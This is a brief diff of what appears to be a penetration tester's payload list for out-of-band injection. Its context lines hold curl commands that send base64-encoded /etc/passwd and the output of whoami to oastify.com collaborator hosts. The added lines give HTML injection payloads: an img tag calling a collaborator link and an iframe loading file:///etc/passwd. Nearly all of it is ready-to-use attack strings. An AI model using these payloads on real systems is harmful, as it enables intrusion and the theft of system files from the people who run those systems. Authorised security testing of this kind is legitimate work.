@@ -94,3 +94,6 @@ curl https://5pvpqatjb8ynm0oz5d87uv2qxh38ryfn.oastify.com/$(base64 -w 0 /etc/pas
 ("curl 0311exb3k08l3ssppr1iofvp6gc70yon.oastify.com/$(whoami)",)
 
 
+OPTIONAL FOR THE HTML INJECTION 
+<img src="http://[your-collab-link]/test">
+<iframe src="file:///etc/passwd" width="500" height="500"></iframe>
